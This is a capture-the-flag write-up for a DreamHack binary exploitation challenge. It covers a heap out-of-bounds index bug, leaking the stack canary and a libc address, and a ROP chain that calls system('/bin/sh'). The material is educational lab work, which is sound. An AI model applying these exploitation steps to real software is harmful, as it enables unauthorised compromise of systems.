# DreamHack 2103 "Platform 9½" (level 4)

docker

`docker run -p 1000:31337 be5f7ed38443`


## checksec
- Full RELRO
- Canary found
- NX Enabled
- PIE enabled

## Vulnerability

- OOB in heap (no index range test)


## Strategy

- at first, stack overflow is not possible.
  - read size: 0x80 = 128
  - buffer size: 0x88 = 136

1. using OOB, overwrite `dword_4010` (using ASLR brute force) -> manipulate read_size
2. overwrite stack buffer -> upper stack frame is `strcpy`'d to heap -> leak libc by printing the heap memory
3. using leaked canary and libc, insert ROP chain to the stack memory
4. PROFIT!!!!

## Exploit

**stack of main()**
```
$rbp+0x08 -> return address of main()
$rbp      -> old rbp
--------------------
$rbp-0x08 -> canary
$rbp-0x10 -> buf[0x80]
...
$rbp-0x90 -> buf[0]
$rbp-0x98 -> s[9] (accessed with edit_list(10))
...
$rbp-0xd8 -> s[1] (accessed with edit_list(2))
$rbp-0xe0 -> s[0] (accessed with edit_list(1))
$rbp-0xe8 -> dword_4010 (=0x80, in BSS section)
...
$rsp
```

1. overwrite `dword_4010`

- edit_list(0, 0xb8)

2. leak canary and libc
- edit_list(1, ( b'A' * 0x89 ))
- view_list(1, 0x89 + 0x7)
-> leak canary
- edit_list(1, ( b'A' * 0x98 ))
- view_list(1, 0x98 + 0x8)
-> leak libc (`__libc_start_main`)

3. inject ROP chain
- ROP chain payload:
  - poprdi + binsh + ret + system

## Troubleshooting

**Troubleshoot 1**: The leaked libc address is weird

-> libc address is 6-byte long. -> we should read the first 6 bytes of the stack leak, and append `'\x00\x00'`, and then unpack.